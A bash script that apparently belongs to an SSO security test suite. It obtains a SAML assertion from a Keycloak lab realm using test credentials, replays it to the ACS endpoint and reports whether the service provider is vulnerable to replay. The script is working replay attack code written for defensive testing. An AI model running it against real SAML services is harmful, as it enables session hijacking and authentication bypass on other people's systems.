#!/usr/bin/env bash
# A11 — SAML Assertion Replay
# OWASP ASVS v4.2 § 3.5.3 / MITRE ATT&CK T1550.004
#
# Profile: e1b (Keycloak + SAML + Password)
#
# Obtains a valid SAML Response through legitimate login, then replays
# the exact same base64-encoded assertion to the ACS endpoint.
# If the SP does not track consumed assertion IDs, the replay succeeds.
#
# Usage:
#   bash A11_saml_assertion_replay.sh <app_url> <idp_url> [realm] [username] [password]

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/common.sh"

APP_URL="${1:?Usage: $0 <app_url> <idp_url> [realm] [username] [password]}"
IDP_URL="${2:?}"
REALM="${3:-sso-lab}"
USERNAME="${4:-testuser}"
PASSWORD="${5:-testpass123}"

REPLAY_DELAY=5

echo "[A11] SAML Assertion Replay — missing assertion ID tracking"
echo "     App: $APP_URL  |  IdP: $IDP_URL  |  Realm: $REALM"
echo

# ── Step 1: Perform SP-initiated login and capture the SAMLResponse ──────────
JAR="/tmp/a11_cookies_$$.txt"
rm -f "$JAR"

echo "  [1] Initiating SAML SP-initiated login..."

# Step 1a: Hit /login to get redirected to IdP
LOGIN_RESP=$(rcurl -sk -D /tmp/a11_headers_$$ -c "$JAR" -L --max-redirs 5 \
  "${APP_URL%/}/login" -o /tmp/a11_login_page_$$.html 2>/dev/null || true)

# Step 1b: Find Keycloak login form and submit credentials
FORM_ACTION=$(grep -oP 'action="([^"]+)"' /tmp/a11_login_page_$$.html 2>/dev/null | head -1 | sed 's/action="//;s/"$//' || true)
if [[ -n "$FORM_ACTION" ]]; then
  FORM_ACTION=$(echo "$FORM_ACTION" | sed 's/&amp;/\&/g')
  echo "      Found login form, submitting credentials..."
  rcurl -sk -L -c "$JAR" -b "$JAR" --max-redirs 10 \
    -X POST "$FORM_ACTION" \
    -d "username=${USERNAME}" \
    -d "password=${PASSWORD}" \
    -d "credentialId=" \
    -o /tmp/a11_after_login_$$.html 2>/dev/null || true
fi

# Step 1c: The final redirect should have posted SAMLResponse to /saml/acs.
# Since curl doesn't auto-submit POST forms, we need an alternative approach:
# Use a programmatic flow with cookie jar to capture the session.

# Try direct approach: use the session cookie if login succeeded
SESS_COOKIE=""
if [[ -f "$JAR" ]]; then
  SESS_COOKIE=$(grep -i "sess" "$JAR" 2>/dev/null | awk '{print $NF}' | head -1 || true)
fi

if [[ -z "$SESS_COOKIE" ]]; then
  echo "      Could not obtain session via browser flow."
  echo "      Attempting programmatic SAML exchange..."
fi

# ── Step 1 (alt): Programmatic approach via IdP token endpoint ───────────────
# For testing purposes, construct a valid SAMLResponse by hitting the IdP
# directly and capturing the response.

# Build AuthnRequest
REQUEST_ID="a11_test_$(date +%s)"
ACS_URL="${APP_URL%/}/saml/acs"
IDP_SSO_URL="${IDP_URL%/}/realms/${REALM}/protocol/saml"

AUTHN_REQUEST="<samlp:AuthnRequest xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"_${REQUEST_ID}\" Version=\"2.0\" IssueInstant=\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\" ProtocolBinding=\"urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST\" AssertionConsumerServiceURL=\"${ACS_URL}\"><saml:Issuer>sso-test-app-saml</saml:Issuer></samlp:AuthnRequest>"

ENCODED_REQUEST=$(printf '%s' "$AUTHN_REQUEST" | base64)

echo "      Sending AuthnRequest to IdP..."

# Hit the IdP SSO endpoint which will redirect to login form
LOGIN_PAGE="/tmp/a11_idp_login_$$.html"
rcurl -sk -L -c "$JAR" -b "$JAR" \
  -D /tmp/a11_idp_headers_$$ \
  "${IDP_SSO_URL}?SAMLRequest=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${ENCODED_REQUEST}'))")" \
  -o "$LOGIN_PAGE" 2>/dev/null || true

# Submit credentials at the IdP
KC_FORM_ACTION=$(grep -oP 'action="([^"]+)"' "$LOGIN_PAGE" 2>/dev/null | head -1 | sed 's/action="//;s/"$//' || true)
SAML_RESPONSE_B64=""

if [[ -n "$KC_FORM_ACTION" ]]; then
  KC_FORM_ACTION=$(echo "$KC_FORM_ACTION" | sed 's/&amp;/\&/g')

  echo "      Submitting credentials to IdP..."

  # The response from this POST should be the SAMLResponse via HTTP-POST binding
  # Keycloak returns an HTML form that auto-submits with SAMLResponse
  IDP_RESPONSE="/tmp/a11_idp_response_$$.html"
  rcurl -sk -L -c "$JAR" -b "$JAR" --max-redirs 5 \
    -X POST "$KC_FORM_ACTION" \
    -d "username=${USERNAME}" \
    -d "password=${PASSWORD}" \
    -d "credentialId=" \
    -D /tmp/a11_post_headers_$$ \
    -o "$IDP_RESPONSE" 2>/dev/null || true

  # Extract SAMLResponse from HTML form
  SAML_RESPONSE_B64=$(grep -oP 'name="SAMLResponse"\s+value="([^"]+)"' "$IDP_RESPONSE" 2>/dev/null | sed 's/.*value="//;s/"$//' || true)
  RELAY_STATE=$(grep -oP 'name="RelayState"\s+value="([^"]+)"' "$IDP_RESPONSE" 2>/dev/null | sed 's/.*value="//;s/"$//' || true)

  rm -f "$IDP_RESPONSE"
fi

if [[ -z "$SAML_RESPONSE_B64" ]]; then
  echo "      Could not capture SAMLResponse from IdP."
  echo
  echo "SKIPPED — unable to complete SAML authentication flow"
  rm -f "$JAR" /tmp/a11_*_$$.*
  exit 0
fi

echo "      Captured SAMLResponse (${#SAML_RESPONSE_B64} chars)"

# Decode and inspect the assertion
DECODED_XML=$(printf '%s' "$SAML_RESPONSE_B64" | base64 -d 2>/dev/null || true)
ASSERTION_ID=$(echo "$DECODED_XML" | python3 -c "
import sys, re
data = sys.stdin.read()
m = re.search(r'<Assertion[^>]*\bID=\"([^\"]+)\"', data)
print(m.group(1) if m else 'unknown')" 2>/dev/null || echo "unknown")

ASSERTION_NAMEID=$(echo "$DECODED_XML" | python3 -c "
import sys, re
data = sys.stdin.read()
m = re.search(r'<NameID[^>]*>([^<]+)</NameID>', data)
print(m.group(1) if m else 'unknown')" 2>/dev/null || echo "unknown")

NOT_ON_OR_AFTER=$(echo "$DECODED_XML" | python3 -c "
import sys, re
data = sys.stdin.read()
m = re.search(r'NotOnOrAfter=\"([^\"]+)\"', data)
print(m.group(1) if m else 'not_set')" 2>/dev/null || echo "not_set")

echo "      Assertion ID:   $ASSERTION_ID"
echo "      NameID:          $ASSERTION_NAMEID"
echo "      NotOnOrAfter:    $NOT_ON_OR_AFTER"
echo

# ── Step 2: First submission of the assertion (baseline) ──────────────────────
echo "  [2] Submitting SAMLResponse to ACS endpoint (first time)..."

RESP_FILE="/tmp/a11_first_resp_$$.txt"
STATUS1=$(rcurl -sk -o "$RESP_FILE" -w "%{http_code}" \
  -X POST \
  -d "SAMLResponse=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$SAML_RESPONSE_B64'))")" \
  ${RELAY_STATE:+-d "RelayState=$RELAY_STATE"} \
  "${APP_URL%/}/saml/acs" 2>/dev/null || echo "000")

BODY1=$(head -c 300 "$RESP_FILE" 2>/dev/null || true)
rm -f "$RESP_FILE"

echo "      → HTTP $STATUS1"
if [[ "$STATUS1" == "200" || "$STATUS1" == "302" ]]; then
  echo "      First submission accepted"
else
  echo "      First submission returned unexpected status"
fi
echo

# Get session cookie from first request for later verification
FIRST_JAR="/tmp/a11_first_jar_$$.txt"
rcurl -sk -c "$FIRST_JAR" -b "$FIRST_JAR" -L --max-redirs 3 \
  -X POST \
  -d "SAMLResponse=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$SAML_RESPONSE_B64'))")" \
  ${RELAY_STATE:+-d "RelayState=$RELAY_STATE"} \
  "${APP_URL%/}/saml/acs" -o /dev/null 2>/dev/null || true

FIRST_DASHBOARD=""
if [[ -f "$FIRST_JAR" ]]; then
  DASH_STATUS=$(rcurl -sk -b "$FIRST_JAR" -o /tmp/a11_dash_$$.html -w "%{http_code}" \
    "${APP_URL%/}/dashboard" 2>/dev/null || echo "000")
  FIRST_DASHBOARD=$(head -c 500 /tmp/a11_dash_$$.html 2>/dev/null || true)
  rm -f /tmp/a11_dash_$$.html
fi

# ── Step 3: Wait then replay the same assertion ────────────────────────────────
echo "  [3] Waiting ${REPLAY_DELAY}s before replay..."
sleep "$REPLAY_DELAY"

echo "      Replaying same SAMLResponse (assertion ID: $ASSERTION_ID)..."

RESP_FILE="/tmp/a11_replay_resp_$$.txt"
REPLAY_JAR="/tmp/a11_replay_jar_$$.txt"

STATUS2=$(rcurl -sk -o "$RESP_FILE" -c "$REPLAY_JAR" -w "%{http_code}" \
  -X POST \
  -d "SAMLResponse=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$SAML_RESPONSE_B64'))")" \
  ${RELAY_STATE:+-d "RelayState=$RELAY_STATE"} \
  "${APP_URL%/}/saml/acs" 2>/dev/null || echo "000")

BODY2=$(head -c 300 "$RESP_FILE" 2>/dev/null || true)
rm -f "$RESP_FILE"

echo "      → HTTP $STATUS2"

# Check if replay got us a dashboard (meaning auth bypass via replay)
REPLAY_DASHBOARD=""
if [[ -f "$REPLAY_JAR" ]] && [[ "$STATUS2" == "302" || "$STATUS2" == "200" ]]; then
  DASH_STATUS2=$(rcurl -sk -b "$REPLAY_JAR" -o /tmp/a11_dash2_$$.html -w "%{http_code}" \
    "${APP_URL%/}/dashboard" 2>/dev/null || echo "000")
  REPLAY_DASHBOARD=$(head -c 500 /tmp/a11_dash2_$$.html 2>/dev/null || true)
  rm -f /tmp/a11_dash2_$$.html
fi

if [[ -n "$REPLAY_DASHBOARD" ]] && echo "$REPLAY_DASHBOARD" | grep -qi "$ASSERTION_NAMEID\|welcome\|logged"; then
  echo "      Dashboard accessible after replay — shows user content"
fi
echo

# ── Cleanup ──────────────────────────────────────────────────────────────────
rm -f "$JAR" "$FIRST_JAR" "$REPLAY_JAR" /tmp/a11_*_$$.*

# ── Verdict ──────────────────────────────────────────────────────────────────
if [[ "$STATUS1" == "302" && "$STATUS2" == "302" ]]; then
  echo "VULNERABLE — SAML assertion was accepted on replay (no assertion ID tracking)"
elif [[ "$STATUS1" == "200" && "$STATUS2" == "200" ]]; then
  echo "VULNERABLE — SAML assertion was accepted on replay (no assertion ID tracking)"
elif [[ "$STATUS2" == "403" ]]; then
  echo "PROTECTED  — Replayed assertion was rejected (HTTP 403)"
elif [[ "$STATUS1" != "302" && "$STATUS1" != "200" ]]; then
  echo "INCONCLUSIVE — could not establish baseline (first use returned HTTP $STATUS1)"
else
  echo "PROTECTED  — Server rejected or did not process the replayed assertion (HTTP $STATUS2)"
fi
